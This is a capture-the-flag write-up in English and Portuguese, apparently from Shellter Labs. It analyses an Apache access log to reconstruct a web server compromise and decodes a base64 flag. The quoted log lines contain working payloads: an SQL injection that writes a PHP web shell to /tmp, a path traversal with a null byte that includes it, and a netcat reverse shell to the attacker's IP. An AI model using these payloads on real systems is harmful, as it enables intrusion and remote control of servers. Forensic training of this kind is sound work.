Access Granted (20 points):

Um dos nossos servidores foi invadido. Agora precisamos analisar os logs da nossa aplicação web pra descobrir qual a gravidade do ataque, e o que ele fez na máquima

"One of our servers has been invaded. Now we need to analyze the logs of our web app to find out whats the gravity of the attack, and what he did in the box."

Lets check the file:

root@debian:~/shellterlabs/acess_granted_20# file access.log
access.log: ASCII text, with very long lines

Looks like a plain text web server log with a lot of 404 responses, so lets filtrate a little:

root@debian:~/shellterlabs/acess_granted_20# cat access.log | grep -v "404"
172.16.59.236 - - [24/Feb/2017:11:37:51 -0500] "GET /shellter/login.php HTTP/1.1" 200 - "http://172.16.59.138/shellter/login.php" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:47:15 -0500] "POST /shellter/login.php HTTP/1.1" 200 - "http://172.16.59.138/shellter/login.php" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:47:35 -0500] "GET /shellter/index.php HTTP/1.1" 200 4584 "http://172.16.59.138/shellter/login.php" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:48:13 -0500] "GET /shellter/security.php HTTP/1.1" 200 4104 "http://172.16.59.138/shellter/index.php" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:48:14 -0500] "GET /shellter/security.php HTTP/1.1" 200 4104 "http://172.16.59.138/shellter/index.php" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:50:20 -0500] "POST /shellter/security.php HTTP/1.1" 302 - "http://172.16.59.138/shellter/security.php" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:51:25 -0500] "GET /shellter/security.php HTTP/1.1" 200 4187 "http://172.16.59.138/shellter/security.php" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:52:11 -0500] "GET /shellter/forum/321/ HTTP/1.1" 200 4333 "http://172.16.59.138/shellter/security.php" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:54:25 -0500] "GET /shellter/forum/321/ HTTP/1.1" 200 4333 "http://172.16.59.138/shellter/security.php" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:54:32 -0500] "GET /shellter/forum/321/?id=%25%27+and+1%3D0+union+select+null%2C+_utf8%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+INTO+DUMPFILE+%22%2Ftmp%2Fshell%22+%23&Submit=Submit HTTP/1.1" 200 5221 "http://172.16.59.138/shellter/forum/321/" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:54:44 -0500] "GET /shellter/forum/321/?id=%25%27+and+1%3D0+union+select+null%2C+_utf8%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+INTO+DUMPFILE+%22%2Ftmp%2Fshell%22+%23&Submit=Submit HTTP/1.1" 200 43 "http://172.16.59.138/shellter/forum/321/" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:55:39 -0500] "GET /shellter/ HTTP/1.1" 200 4497 "-" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:57:02 -0500] "GET /shellter/forum/fi/?page=include.php HTTP/1.1" 200 4083 "http://172.16.59.138/shellter/" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:57:32 -0500] "GET /shellter/forum/fi/?page=include.php HTTP/1.1" 200 4083 "http://172.16.59.138/shellter/" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:11:58:41 -0500] "GET /shellter/forum/fi/?page=../../../../../../tmp/shell%00&cmd=nc%20172.16.59.236%20441%20-e%20/bin/bash%20echo%20%22c2hlbGx0ZXJ7MTRtaDRjazNyfQ==%22 HTTP/1.1" 200 4088 "-" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"
172.16.59.236 - - [24/Feb/2017:12:38:03 -0300] "GET /shellter/icons/ HTTP/1.1" 403 502 "-" "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0"
::1 - - [24/Feb/2017:12:38:38 -0300] "OPTIONS * HTTP/1.0" 200 125 "-" "Apache/2.4.7 (Ubuntu) PHP/5.5.9-1ubuntu4.20 (internal dummy connection)"

Some path transversal and sql attemps where the flag lies this line:

172.16.59.236 - - [24/Feb/2017:11:54:44 -0500] "GET /shellter/forum/321/?id=%25%27+and+1%3D0+union+select+null%2C+_utf8%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B+%3F%3E%22+INTO+DUMPFILE+%22%2Ftmp%2Fshell%22+%23&Submit=Submit HTTP/1.1" 200 43 "http://172.16.59.138/shellter/forum/321/" "Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0"

root@debian:~/shellterlabs/acess_granted_20# echo "c2hlbGx0ZXJ7MTRtaDRjazNyfQ==" | base64 -d
shellter{14mh4ck3r}
